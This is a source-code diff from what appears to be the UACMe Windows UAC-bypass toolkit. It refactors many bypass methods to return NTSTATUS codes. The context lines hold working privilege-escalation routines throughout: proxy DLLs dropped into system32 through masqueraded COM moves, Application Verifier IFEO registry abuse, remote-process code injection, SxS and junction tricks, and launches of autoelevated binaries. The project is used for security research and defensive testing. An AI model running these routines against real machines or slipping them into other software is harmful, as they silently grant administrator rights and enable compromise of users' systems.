@@ -6,7 +6,7 @@
 *
 *  VERSION:     3.17
 *
-*  DATE:        17 Mar 2019
+*  DATE:        18 Mar 2019
 *
 *  Hybrid UAC bypass methods.
 *
@@ -54,12 +54,13 @@ BOOL ucmMethodCleanupSingleItemSystem32(
 * Fixed in Windows 10 TH1
 *
 */
-BOOL ucmAvrfMethod(
+NTSTATUS ucmAvrfMethod(
     _In_ PVOID AvrfDll,
     _In_ DWORD AvrfDllSize
 )
 {
-    BOOL bResult = FALSE, bWusaNeedCleanup = FALSE;
+    BOOL bWusaNeedCleanup = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
     HKEY hKey = NULL, hSubKey = NULL;
     LRESULT lRet;
     DWORD dwValue = 0x100; // FLG_APPLICATION_VERIFIER;
@@ -104,7 +105,9 @@ BOOL ucmAvrfMethod(
         _strcat(szBuffer, T_IFEO);
         RtlInitUnicodeString(&ustr, szBuffer);
         InitializeObjectAttributes(&obja, &ustr, OBJ_CASE_INSENSITIVE, NULL, NULL);
-        if (!NT_SUCCESS(NtOpenKey((PHANDLE)&hKey, MAXIMUM_ALLOWED, &obja)))
+
+        MethodResult = NtOpenKey((PHANDLE)&hKey, MAXIMUM_ALLOWED, &obja);
+        if (!NT_SUCCESS(MethodResult))
             break;
 
         //
@@ -112,23 +115,29 @@ BOOL ucmAvrfMethod(
         // 
         hSubKey = NULL;
         lRet = RegCreateKey(hKey, CLICONFG_EXE, &hSubKey);
-        if ((hSubKey == NULL) || (lRet != ERROR_SUCCESS))
+        if ((hSubKey == NULL) || (lRet != ERROR_SUCCESS)) {
+            MethodResult = STATUS_ACCESS_DENIED;
             break;
+        }
 
         //
         // Set verifier flag value.
         //
         lRet = RegSetValueEx(hSubKey, T_GLOBAL_FLAG, 0, REG_DWORD, (BYTE*)&dwValue, sizeof(DWORD));
-        if (lRet != ERROR_SUCCESS)
+        if (lRet != ERROR_SUCCESS) {
+            MethodResult = STATUS_ACCESS_DENIED;
             break;
+        }
 
         //
         // Set verifier dll value.
         // 
         dwValue = (DWORD)((1 + _strlen(HIBIKI_DLL)) * sizeof(WCHAR));
         lRet = RegSetValueEx(hSubKey, TEXT("VerifierDlls"), 0, REG_SZ, (BYTE*)&HIBIKI_DLL, dwValue);
-        if (lRet != ERROR_SUCCESS)
+        if (lRet != ERROR_SUCCESS) {
+            MethodResult = STATUS_ACCESS_DENIED;
             break;
+        }
 
         //
         // Cleanup registry, we don't need anymore.
@@ -153,7 +162,8 @@ BOOL ucmAvrfMethod(
                 RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
                 _strcpy(szBuffer, g_ctx->szSystemDirectory);
                 _strcat(szBuffer, CLICONFG_EXE);
-                bResult = supRunProcess(szBuffer, NULL);
+                if (supRunProcess(szBuffer, NULL))
+                    MethodResult = STATUS_SUCCESS;
             }
             ucmWusaCabinetCleanup();
         }
@@ -169,7 +179,7 @@ BOOL ucmAvrfMethod(
     if (bWusaNeedCleanup) {
         ucmWusaCabinetCleanup();
     }
-    return bResult;
+    return MethodResult;
 }
 
 /*
@@ -185,21 +195,22 @@ BOOL ucmAvrfMethod(
 * Fixed in Windows 10 TH2 (complete vector)
 *
 */
-BOOL ucmWinSATMethod(
+NTSTATUS ucmWinSATMethod(
     _In_ LPWSTR lpTargetDll,
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize,
     _In_ BOOL UseWusa
 )
 {
-    BOOL bResult = FALSE, cond = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+    BOOL bCopyResult = FALSE;
     CABDATA *Cabinet = NULL;
     WCHAR szSource[MAX_PATH * 2];
     WCHAR szDest[MAX_PATH * 2];
     WCHAR szBuffer[MAX_PATH * 2];
 
     if (_strlen(lpTargetDll) > 100) {
-        return bResult;
+        return STATUS_INVALID_PARAMETER_1;
     }
 
     RtlSecureZeroMemory(szSource, sizeof(szSource));
@@ -215,9 +226,6 @@ BOOL ucmWinSATMethod(
 
         // Copy winsat to temp directory
         if (!CopyFile(szSource, szDest, FALSE)) {
-#ifdef _DEBUG
-            supDebugPrint(TEXT("ucmWinSATMethod"), GetLastError());
-#endif
             break;
         }
 
@@ -262,7 +270,7 @@ BOOL ucmWinSATMethod(
             RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
             _strcpy(szBuffer, g_ctx->szSystemDirectory);
             _strcat(szBuffer, SYSPREP_DIR);
-            bResult = ucmWusaExtractPackage(szBuffer);
+            bCopyResult = ucmWusaExtractPackage(szBuffer);
         }
         else {
 
@@ -271,19 +279,14 @@ BOOL ucmWinSATMethod(
             _strcpy(szBuffer, g_ctx->szSystemDirectory);
             _strcat(szBuffer, SYSPREP_DIR);
 
-            bResult = ucmMasqueradedMoveFileCOM(szSource, szBuffer);
-            if (!bResult) {
-                break;
-            }
-            bResult = ucmMasqueradedMoveFileCOM(szDest, szBuffer);
-            if (!bResult) {
-                break;
+            if (ucmMasqueradedMoveFileCOM(szSource, szBuffer)) {
+                bCopyResult = ucmMasqueradedMoveFileCOM(szDest, szBuffer);
             }
         }
 
-    } while (cond);
+    } while (FALSE);
 
-    if (bResult) {
+    if (bCopyResult) {
 
         //run winsat
         RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
@@ -291,8 +294,8 @@ BOOL ucmWinSATMethod(
         _strcat(szBuffer, SYSPREP_DIR);
         _strcat(szBuffer, WINSAT_EXE);
 
-        bResult = supRunProcess(szBuffer, NULL);
-        //cleanup of the above files must be done by payload code
+        if (supRunProcess(szBuffer, NULL))
+            MethodResult = STATUS_SUCCESS;
     }
 
     if (Cabinet) {
@@ -306,7 +309,7 @@ BOOL ucmWinSATMethod(
         DeleteFileW(szSource);
     }
 
-    return bResult;
+    return MethodResult;
 }
 
 /*
@@ -352,20 +355,20 @@ BOOL ucmMMCMethodCleanup(
 * Bypass UAC by abusing MMC.exe backdoor hardcoded in appinfo.dll
 *
 */
-BOOL ucmMMCMethod(
+NTSTATUS ucmMMCMethod(
     _In_ UCM_METHOD Method,
     _In_ LPWSTR lpTargetDll,
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL bResult = FALSE, cond = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
     LPWSTR lpMscFile = NULL;
     WCHAR szSource[MAX_PATH * 2];
     WCHAR szDest[MAX_PATH * 2];
 
     if (_strlen(lpTargetDll) > 100) {
-        return bResult;
+        return STATUS_INVALID_PARAMETER_2;
     }
 
     do {
@@ -414,19 +417,19 @@ BOOL ucmMMCMethod(
         }
 
         //move proxy dll to target directory
-        bResult = ucmMasqueradedMoveFileCOM(szSource, szDest);
-        if (!bResult) {
+        if (!ucmMasqueradedMoveFileCOM(szSource, szDest)) {
             break;
         }
 
         //run mmc console
         //because of mmc harcoded backdoor uac will autoelevate mmc with valid and trusted MS command.
         //yuubari identified multiple exploits in msc commands loading scheme.
-        bResult = supRunProcess(MMC_EXE, lpMscFile);
+        if (supRunProcess(MMC_EXE, lpMscFile))
+            MethodResult = STATUS_SUCCESS;
 
-    } while (cond);
+    } while (FALSE);
 
-    return bResult;
+    return MethodResult;
 }
 
 /*
@@ -501,12 +504,12 @@ DWORD WINAPI ucmxElevatedLaunchProc(
 * Fixed in Windows 10 TH2
 *
 */
-BOOL ucmSirefefMethod(
+NTSTATUS ucmSirefefMethod(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL                      bResult = FALSE, bCond = FALSE;
+    NTSTATUS                  MethodResult = STATUS_ACCESS_DENIED, Status;
     SIZE_T                    memIO;
 
     HANDLE                    hProcess = NULL, hRemoteThread = NULL;
@@ -599,36 +602,42 @@ BOOL ucmSirefefMethod(
         //
         memIO = NtHeaders->OptionalHeader.SizeOfImage;
 
-        if (!NT_SUCCESS(NtAllocateVirtualMemory(
+        Status = NtAllocateVirtualMemory(
             hProcess,
             &RemoteCode,
             0,
             &memIO,
             MEM_COMMIT | MEM_RESERVE,
-            PAGE_EXECUTE_READWRITE)))
-        {
+            PAGE_EXECUTE_READWRITE);
+
+        if (!NT_SUCCESS(Status)) {
+            MethodResult = Status;
             break;
         }
 
-        if (RemoteCode == NULL)
+        if (RemoteCode == NULL) {
+            MethodResult = STATUS_INTERNAL_ERROR;
             break;
+        }
 
         memIO = NtHeaders->OptionalHeader.SizeOfImage;
 
-        if (!NT_SUCCESS(NtWriteVirtualMemory(
+        Status = NtWriteVirtualMemory(
             hProcess,
             RemoteCode,
             InjectorImageBase,
             memIO,
-            &memIO)))
-        {
+            &memIO);
+
+        if (!NT_SUCCESS(Status)) {
+            MethodResult = Status;
             break;
         }
 
         newEp = (char *)RemoteCode + ((char *)LoadProc - (char *)InjectorImageBase);
         newDp = (char *)RemoteCode + ((char *)LoadParams - (char *)InjectorImageBase);
 
-        if (!NT_SUCCESS(RtlCreateUserThread(
+        Status = RtlCreateUserThread(
             hProcess,
             NULL,
             FALSE,
@@ -638,18 +647,21 @@ BOOL ucmSirefefMethod(
             (PUSER_THREAD_START_ROUTINE)newEp,
             newDp,
             &hRemoteThread,
-            NULL)))
+            NULL);
+
+        if (!NT_SUCCESS(Status))
         {
+            MethodResult = Status;
             break;
         }
 
-        bResult = (hRemoteThread != NULL);
-        if (bResult) {
+        if (hRemoteThread != NULL) {
             WaitForSingleObject(hRemoteThread, INFINITE);
             NtClose(hRemoteThread);
+            MethodResult = STATUS_SUCCESS;
         }
 
-    } while (bCond);
+    } while (FALSE);
 
     //
     // Cleanup (system32\wbem data must be removed by payload code).
@@ -667,7 +679,7 @@ BOOL ucmSirefefMethod(
     _strcat(szB1, OOBE_EXE);
     DeleteFile(szB1);
 
-    return bResult;
+    return MethodResult;
 }
 
 /*
@@ -678,49 +690,43 @@ BOOL ucmSirefefMethod(
 * Bypass UAC by abusing target autoelevated system32 application via missing system32 dll
 *
 */
-BOOL ucmGenericAutoelevation(
+NTSTATUS ucmGenericAutoelevation(
     _In_ LPWSTR lpTargetApp,
     _In_ LPWSTR lpTargetDll,
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL bResult = FALSE, cond = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
     WCHAR szSource[MAX_PATH * 2];
     WCHAR szDest[MAX_PATH * 2];
 
     if (_strlen(lpTargetDll) > 100) {
-        return bResult;
+        return STATUS_INVALID_PARAMETER_2;
     }
 
-    do {
+    //put target dll
+    RtlSecureZeroMemory(szSource, sizeof(szSource));
+    _strcpy(szSource, g_ctx->szTempDirectory);
+    _strcat(szSource, lpTargetDll);
 
-        //put target dll
-        RtlSecureZeroMemory(szSource, sizeof(szSource));
-        _strcpy(szSource, g_ctx->szTempDirectory);
-        _strcat(szSource, lpTargetDll);
-
-        //write proxy dll to disk
-        if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
-            break;
-        }
+    //write proxy dll to disk
+    if (supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
 
         //target dir
         RtlSecureZeroMemory(szDest, sizeof(szDest));
         _strcpy(szDest, g_ctx->szSystemDirectory);
 
         //drop payload to system32
-        bResult = ucmMasqueradedMoveFileCOM(szSource, szDest);
-        if (!bResult) {
-            break;
+        if (ucmMasqueradedMoveFileCOM(szSource, szDest)) {
+
+            //run target app
+            if (supRunProcess(lpTargetApp, NULL))
+                MethodResult = STATUS_SUCCESS;
         }
+    }
 
-        //run target app
-        bResult = supRunProcess(lpTargetApp, NULL);
-
-    } while (cond);
-
-    return bResult;
+    return MethodResult;
 }
 
 /*
@@ -739,12 +745,13 @@ BOOL ucmGenericAutoelevation(
 * Fixed in Windows 10 RS1
 *
 */
-BOOL ucmGWX(
+NTSTATUS ucmGWX(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL   bResult = FALSE, cond = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+
     WCHAR  szDest[MAX_PATH * 2];
     WCHAR  szSource[MAX_PATH * 2];
     WCHAR  szTargetApp[MAX_PATH * 2];
@@ -763,8 +770,9 @@ BOOL ucmGWX(
         //File already exist, so IIS could be installed
         if (PathFileExists(szDest)) {
 #ifdef _DEBUG
-            supDebugPrint(TEXT("ucmGWX"), ERROR_ALREADY_EXISTS);
+            supDebugPrint(TEXT("ucmGWX"), STATUS_OBJECT_NAME_EXISTS);
 #endif
+            MethodResult = STATUS_OBJECT_NAME_EXISTS;
             break;
         }
 
@@ -772,8 +780,9 @@ BOOL ucmGWX(
         Ptr = supReadFileToBuffer(KONGOU_CD, &DataSize);
         if (Ptr == NULL) {
 #ifdef _DEBUG
-            supDebugPrint(TEXT("ucmGWX"), ERROR_FILE_NOT_FOUND);
+            supDebugPrint(TEXT("ucmGWX"), STATUS_OBJECT_NAME_NOT_FOUND);
 #endif
+            MethodResult = STATUS_OBJECT_NAME_NOT_FOUND;
             break;
         }
 
@@ -792,8 +801,7 @@ BOOL ucmGWX(
         RtlSecureZeroMemory(szDest, sizeof(szDest));
         _strcpy(szDest, g_ctx->szSystemDirectory);
         _strcat(szDest, INETSRV_DIR);
-        bResult = ucmMasqueradedMoveFileCOM(szSource, szDest);
-        if (!bResult) {
+        if (!ucmMasqueradedMoveFileCOM(szSource, szDest)) {
             break;
         }
 
@@ -808,16 +816,16 @@ BOOL ucmGWX(
         }
 
         //drop InetMgr.exe to system32\inetsrv
-        bResult = ucmMasqueradedMoveFileCOM(szSource, szDest);
-        if (!bResult) {
+        if (!ucmMasqueradedMoveFileCOM(szSource, szDest)) {
             break;
         }
 
         _strcpy(szTargetApp, szDest);
         _strcat(szTargetApp, INETMGR_EXE);
-        bResult = supRunProcess(szTargetApp, NULL);
+        if (supRunProcess(szTargetApp, NULL))
+            MethodResult = STATUS_SUCCESS;
 
-    } while (cond);
+    } while (FALSE);
 
     if (Data != NULL) {
         RtlSecureZeroMemory(Data, DecompressedBufferSize);
@@ -827,7 +835,7 @@ BOOL ucmGWX(
     if (Ptr != NULL) {
         supVirtualFree(Ptr, NULL);
     }
-    return bResult;
+    return MethodResult;
 }
 
 /*
@@ -866,12 +874,13 @@ BOOL ucmxAutoElevateManifestDropDll(
 * Special case for Windows 7.
 *
 */
-BOOL ucmAutoElevateManifestW7(
+NTSTATUS ucmAutoElevateManifestW7(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL bResult = FALSE, bCond = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+
     WCHAR szDest[MAX_PATH * 2];
     WCHAR szSource[MAX_PATH * 2];
     LPWSTR lpApplication = NULL;
@@ -883,7 +892,6 @@ BOOL ucmAutoElevateManifestW7(
 
         _strcpy(szSource, g_ctx->szSystemDirectory);
         _strcpy(szDest, g_ctx->szTempDirectory);
-
 
         lpApplication = TASKHOST_EXE;//doesn't really matter, Yuubari module lists multiple targets
         _strcat(szSource, lpApplication);
@@ -899,13 +907,11 @@ BOOL ucmAutoElevateManifestW7(
         RtlSecureZeroMemory(szDest, sizeof(szDest));
         _strcpy(szDest, USER_SHARED_DATA->NtSystemRoot);
         _strcat(szDest, TEXT("\\"));
-        bResult = ucmMasqueradedMoveFileCOM(szSource, szDest);
-        if (!bResult) {
+        if (!ucmMasqueradedMoveFileCOM(szSource, szDest)) {
             break;
         }
 
-        bResult = ucmxAutoElevateManifestDropDll(ProxyDll, ProxyDllSize);
-        if (!bResult) {
+        if (!ucmxAutoElevateManifestDropDll(ProxyDll, ProxyDllSize)) {
             break;
         }
 
@@ -925,18 +931,18 @@ BOOL ucmAutoElevateManifestW7(
 
         RtlSecureZeroMemory(szDest, sizeof(szDest));
         _strcpy(szDest, USER_SHARED_DATA->NtSystemRoot);
-        bResult = ucmMasqueradedMoveFileCOM(szSource, szDest);
-        if (!bResult) {
+        if (!ucmMasqueradedMoveFileCOM(szSource, szDest)) {
             break;
         }
 
         _strcat(szDest, L"\\");
         _strcat(szDest, lpApplication);
-        bResult = supRunProcess(szDest, NULL);
+        if (supRunProcess(szDest, NULL))
+            MethodResult = STATUS_SUCCESS;
 
-    } while (bCond);
+    } while (FALSE);
 
-    return bResult;
+    return MethodResult;
 }
 
 /*
@@ -951,12 +957,13 @@ BOOL ucmAutoElevateManifestW7(
 * Fixed in Windows 10 RS1
 *
 */
-BOOL ucmAutoElevateManifest(
+NTSTATUS ucmAutoElevateManifest(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL bResult = FALSE, bCond = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+
     WCHAR szDest[MAX_PATH * 2];
     WCHAR szSource[MAX_PATH * 2];
     LPWSTR lpApplication = NULL;
@@ -964,8 +971,7 @@ BOOL ucmAutoElevateManifest(
     do {
 
         if (g_ctx->dwBuildNumber < 9600) {
-            bResult = ucmAutoElevateManifestW7(ProxyDll, ProxyDllSize);
-            break;
+            return ucmAutoElevateManifestW7(ProxyDll, ProxyDllSize);
         }
 
         RtlSecureZeroMemory(szSource, sizeof(szSource));
@@ -986,13 +992,11 @@ BOOL ucmAutoElevateManifest(
         // Copy target app to home
         RtlSecureZeroMemory(szDest, sizeof(szDest));
         _strcpy(szDest, g_ctx->szSystemDirectory);
-        bResult = ucmMasqueradedMoveFileCOM(szSource, szDest);
-        if (!bResult) {
+        if (!ucmMasqueradedMoveFileCOM(szSource, szDest)) {
             break;
         }
 
-        bResult = ucmxAutoElevateManifestDropDll(ProxyDll, ProxyDllSize);
-        if (!bResult) {
+        if (!ucmxAutoElevateManifestDropDll(ProxyDll, ProxyDllSize)) {
             break;
         }
 
@@ -1012,18 +1016,18 @@ BOOL ucmAutoElevateManifest(
 
         RtlSecureZeroMemory(szDest, sizeof(szDest));
         _strcpy(szDest, g_ctx->szSystemDirectory);
-        bResult = ucmMasqueradedMoveFileCOM(szSource, szDest);
-        if (!bResult) {
+        if (!ucmMasqueradedMoveFileCOM(szSource, szDest)) {
             break;
         }
 
         _strcpy(szDest, g_ctx->szSystemDirectory);
         _strcat(szDest, lpApplication);
-        bResult = supRunProcess(szDest, NULL);
+        if (supRunProcess(szDest, NULL))
+            MethodResult = STATUS_SUCCESS;
 
-    } while (bCond);
+    } while (FALSE);
 
-    return bResult;
+    return MethodResult;
 }
 
 /*
@@ -1236,21 +1240,21 @@ BOOL ucmxScanFiles(
 * Fixed in Windows 10 RS1
 *
 */
-BOOL ucmInetMgrMethod(
+NTSTATUS ucmInetMgrMethod(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL bResult = FALSE, bCond = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+
+    BOOL bScanResult;
+
     WCHAR szBuffer[MAX_PATH * 2];
     WCHAR szDirBuf[MAX_PATH * 2];
     HANDLE hFindFile;
     WIN32_FIND_DATA fdata;
 
     do {
-
-        if ((ProxyDll == NULL) || (ProxyDllSize == 0))
-            return FALSE;
 
         //target dir
         RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
@@ -1260,9 +1264,7 @@ BOOL ucmInetMgrMethod(
 
         //File already exist, so IIS could be installed
         if (PathFileExists(szBuffer)) {
-#ifdef _DEBUG
-            supDebugPrint(TEXT("ucmInetMgrMethod"), ERROR_ALREADY_EXISTS);
-#endif
+            MethodResult = STATUS_OBJECT_NAME_EXISTS;
             break;
         }
 
@@ -1288,15 +1290,17 @@ BOOL ucmInetMgrMethod(
                         _strcpy(szBuffer, szDirBuf);
                         _strcat(szBuffer, fdata.cFileName);
 
-                        bResult = ucmxScanFiles(
+                        bScanResult = ucmxScanFiles(
                             szBuffer,
                             L"*.exe",
                             (UCMX_FIND_FILE_CALLBACK)&ucmInetMgrFindCallback,
                             ProxyDll,
                             ProxyDllSize);
 
-                        if (bResult)
+                        if (bScanResult) {
+                            MethodResult = STATUS_SUCCESS;
                             break;
+                        }
 
                     }
                 }
@@ -1306,9 +1310,9 @@ BOOL ucmInetMgrMethod(
             FindClose(hFindFile);
         }
 
-    } while (bCond);
+    } while (FALSE);
 
-    return bResult;
+    return MethodResult;
 }
 
 /*
@@ -1328,7 +1332,7 @@ BOOL ucmInetMgrMethod(
 * "You keep shipping crap, and crap, and more crap".
 *
 */
-BOOL ucmSXSMethod(
+NTSTATUS ucmSXSMethod(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize,
     _In_opt_ LPWSTR lpTargetDirectory, //single element in system32 with slash at end
@@ -1337,7 +1341,7 @@ BOOL ucmSXSMethod(
     _In_ BOOL bConsentItself
 )
 {
-    BOOL     bResult = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
     WCHAR   *lpszFullDllPath = NULL, *lpszDirectoryName = NULL;
     SIZE_T   sz;
     LPWSTR   lpSxsPath = NULL;
@@ -1347,10 +1351,10 @@ BOOL ucmSXSMethod(
     SXS_SEARCH_CONTEXT sctx;
 
     if (lpTargetApplication == NULL)
-        return bResult;
+        return STATUS_INVALID_PARAMETER_3;
 
     if (_strlen(lpTargetApplication) > MAX_PATH)
-        return bResult;
+        return STATUS_INVALID_PARAMETER_3;
 
     do {
         //common part, locate sxs dll, drop payload to temp
@@ -1394,8 +1398,7 @@ BOOL ucmSXSMethod(
         _strcpy(szSrc, g_ctx->szTempDirectory);
         _strcat(szSrc, COMCTL32_DLL);
 
-        bResult = supWriteBufferToFile(szSrc, ProxyDll, ProxyDllSize);
-        if (!bResult)
+        if (!supWriteBufferToFile(szSrc, ProxyDll, ProxyDllSize))
             break;
 
         _strcpy(lpSxsPath, g_ctx->szSystemDirectory);
@@ -1446,8 +1449,7 @@ BOOL ucmSXSMethod(
             _strcpy(szDst, lpTargetApplication);
             _strcat(szDst, LOCAL_SXS);
 
-            bResult = ucmMasqueradedRenameElementCOM(lpSxsPath, szDst);
-            if (!bResult)
+            if (!ucmMasqueradedRenameElementCOM(lpSxsPath, szDst))
                 break;
 
         }
@@ -1464,14 +1466,16 @@ BOOL ucmSXSMethod(
         else {
             _strcat(szDst, lpTargetApplication);
         }
-        bResult = supRunProcess(szDst, NULL);
+
+        if (supRunProcess(szDst, NULL))
+            MethodResult = STATUS_SUCCESS;
 
     } while (FALSE);
 
     if (lpszFullDllPath) supVirtualFree(lpszFullDllPath, NULL);
     if (lpSxsPath) supVirtualFree(lpSxsPath, NULL);
 
-    return bResult;
+    return MethodResult;
 }
 
 /*
@@ -1516,12 +1520,14 @@ BOOL ucmSXSMethodCleanup(
 * PkgMgr.exe is autoelevated whitelisted application which is actually just calling Dism.exe
 *
 */
-BOOL ucmDismMethod(
+NTSTATUS ucmDismMethod(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL    bCond = FALSE, bResult = FALSE, bNeedCleanup = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+
+    BOOL    bNeedCleanup = FALSE;
     WCHAR   szSource[MAX_PATH * 2], szDest[MAX_PATH * 2];
 
     do {
@@ -1561,9 +1567,10 @@ BOOL ucmDismMethod(
         _strcat(szSource, g_ctx->szTempDirectory);
         _strcat(szSource, PACKAGE_XML);
 
-        bResult = supRunProcess(szDest, szSource);
+        if (supRunProcess(szDest, szSource))
+            MethodResult = STATUS_SUCCESS;
 
-    } while (bCond);
+    } while (FALSE);
 
     //
     // Cleanup temp.
@@ -1578,7 +1585,7 @@ BOOL ucmDismMethod(
         DeleteFile(szSource);
     }
 
-    return bResult;
+    return MethodResult;
 }
 
 /*
@@ -1592,12 +1599,12 @@ BOOL ucmDismMethod(
 * Loader will map and call our logger dll during wow64 process initialization.
 *
 */
-BOOL ucmWow64LoggerMethod(
+NTSTATUS ucmWow64LoggerMethod(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL bResult = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
     WCHAR szTarget[MAX_PATH * 2];
 
     //
@@ -1608,8 +1615,9 @@ BOOL ucmWow64LoggerMethod(
     _strcat(szTarget, SYSWOW64_DIR);
     _strcat(szTarget, WUSA_EXE);
 
-    bResult = ucmGenericAutoelevation(szTarget, WOW64LOG_DLL, ProxyDll, ProxyDllSize);
-    if (bResult) {
+    if (ucmGenericAutoelevation(szTarget, WOW64LOG_DLL, ProxyDll, ProxyDllSize)) {
+
+        MethodResult = STATUS_SUCCESS;
 
         //
         // Attempt to remove payload dll after execution in method.c!PostCleanupAttempt.
@@ -1617,7 +1625,7 @@ BOOL ucmWow64LoggerMethod(
         // Remove file IMMEDIATELY after work.
         //
     }
-    return bResult;
+    return MethodResult;
 }
 
 /*
@@ -1630,12 +1638,12 @@ BOOL ucmWow64LoggerMethod(
 * https://habrahabr.ru/company/pm/blog/328008/
 *
 */
-BOOL ucmUiAccessMethod(
+NTSTATUS ucmUiAccessMethod(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL bResult = FALSE, bCond = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
     SIZE_T Length;
     DWORD DllVirtualSize;
     LPWSTR lpEnv = NULL, lpTargetDll;
@@ -1659,8 +1667,10 @@ BOOL ucmUiAccessMethod(
         // Replace default Fubuki dll entry point with new.
         //
         NtHeaders = RtlImageNtHeader(ProxyDll);
-        if (NtHeaders == NULL)
+        if (NtHeaders == NULL) {
+            MethodResult = STATUS_INVALID_IMAGE_FORMAT;
             break;
+        }
 
         DllVirtualSize = 0;
         DllBase = PELoaderLoadImage(ProxyDll, &DllVirtualSize);
@@ -1685,8 +1695,10 @@ BOOL ucmUiAccessMethod(
             VirtualFree(DllBase, 0, MEM_RELEASE);
 
         }
-        else
+        else {
+            MethodResult = STATUS_IMAGE_NOT_AT_BASE;
             break;
+        }
 
         //
         // Drop modified fubuki.dll to the %temp%
@@ -1749,12 +1761,13 @@ BOOL ucmUiAccessMethod(
             //
             _strcpy(szTarget, g_ctx->szSystemDirectory);
             _strcat(szTarget, EVENTVWR_EXE);
-            bResult = supRunProcess2(szTarget, NULL, NULL, SW_SHOW, FALSE);
+            if (supRunProcess2(szTarget, NULL, NULL, SW_SHOW, FALSE))
+                MethodResult = STATUS_SUCCESS;
         }
 
-    } while (bCond);
+    } while (FALSE);
 
-    return bResult;
+    return MethodResult;
 }
 
 /*
@@ -1770,12 +1783,13 @@ BOOL ucmUiAccessMethod(
 * Wusa race condition in combination with junctions found by Thomas Vanhoutte.
 *
 */
-BOOL ucmJunctionMethod(
+NTSTATUS ucmJunctionMethod(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL bResult = FALSE, bDropComplete = FALSE, bWusaNeedCleanup = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+    BOOL bDropComplete = FALSE, bWusaNeedCleanup = FALSE;
     HKEY hKey = NULL;
     LRESULT lResult;
 
@@ -1880,7 +1894,8 @@ BOOL ucmJunctionMethod(
         RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
         _strcpy(szBuffer, g_ctx->szSystemDirectory);
         _strcat(szBuffer, DCOMCNFG_EXE);
-        bResult = supRunProcess(szBuffer, NULL);
+        if (supRunProcess(szBuffer, NULL))
+            MethodResult = STATUS_SUCCESS;
 
     } while (FALSE);
 
@@ -1895,7 +1910,7 @@ BOOL ucmJunctionMethod(
         ucmWusaCabinetCleanup();
     }
 
-    return bResult;
+    return MethodResult;
 }
 
 /*
@@ -2008,12 +2023,13 @@ BOOL ucmJunctionMethodCleanup(
 * Dccw idea by Ernesto Fernandez (https://github.com/L3cr0f/DccwBypassUAC)
 *
 */
-BOOL ucmSXSDccwMethod(
+NTSTATUS ucmSXSDccwMethod(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL     bResult = FALSE, bWusaNeedCleanup = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+    BOOL     bWusaNeedCleanup = FALSE;
     HMODULE  hGdiPlus = NULL;
     WCHAR   *lpszFullDllPath = NULL, *lpszDirectoryName = NULL;
     SIZE_T   sz;
@@ -2030,8 +2046,10 @@ BOOL ucmSXSDccwMethod(
 #ifndef _DEBUG
         _strcpy(szTarget, g_ctx->szSystemDirectory);
         _strcat(szTarget, DCCW_EXE);
-        if (!PathFileExists(szTarget))
+        if (!PathFileExists(szTarget)) {
+            MethodResult = STATUS_OBJECT_NAME_NOT_FOUND;
             break;
+        }
 #endif //_DEBUG
         //
         // Load GdiPlus in our address space to get it full path.
@@ -2040,8 +2058,10 @@ BOOL ucmSXSDccwMethod(
         _strcpy(szBuffer, g_ctx->szSystemDirectory);
         _strcat(szBuffer, GDIPLUS_DLL);
         hGdiPlus = LoadLibrary(szBuffer);
-        if (hGdiPlus == NULL)
+        if (hGdiPlus == NULL) {
+            MethodResult = STATUS_DLL_NOT_FOUND;
             break;
+        }
 
         sz = UNICODE_STRING_MAX_BYTES;
 
@@ -2058,8 +2078,10 @@ BOOL ucmSXSDccwMethod(
         sctx.SxsKey = GDIPLUS_SXS;
         sctx.FullDllPath = lpszFullDllPath;
 
-        if (!sxsFindLoaderEntry(&sctx))
+        if (!sxsFindLoaderEntry(&sctx)) {
+            MethodResult = STATUS_SXS_KEY_NOT_FOUND;
             break;
+        }
 
         lpszDirectoryName = _filename(lpszFullDllPath);
         if (lpszDirectoryName == NULL)
@@ -2115,7 +2137,8 @@ BOOL ucmSXSDccwMethod(
         //
         // Run target.
         //
-        bResult = supRunProcess(szTarget, NULL);
+        if (supRunProcess(szTarget, NULL))
+            MethodResult = STATUS_SUCCESS;
 
     } while (FALSE);
